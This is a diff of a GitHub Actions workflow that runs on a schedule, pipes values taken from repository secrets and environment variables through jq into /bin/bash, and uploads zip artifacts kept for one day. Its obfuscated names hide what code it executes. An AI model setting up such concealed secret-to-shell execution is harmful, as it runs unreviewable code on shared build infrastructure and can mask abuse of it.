@@ -1,8 +1,9 @@
 name: pollinggrant2024
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '48 4/6 * * *'
+    - cron: '52 1,7,13,19 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,8 +11,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: pollinggrant2024
         env:
-          zqu8556: ${{ secrets.zqu8556 }}
+          yrjwc8: ${{ secrets.yrjwc8 }}
         run: |
-          echo $zqu8556 | jq -r .nrv94735 | /bin/bash
-          echo $z157 | jq -r .kx571 | /bin/bash
+          printf '%s' "$yrjwc8" | jq -r .meg4357 | /bin/bash
+          echo $pwa50153 | jq -r .x31105 | /bin/bash
+          echo $xn42904 | jq -r .jom9 | /bin/bash
+          echo $lfvqf19873 | jq -r .c74 | /bin/bash
+          echo $cjm61 | jq -r .kfxds48665 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: wVxaUzkO
+          path: "*.zip"
+          retention-days: 1
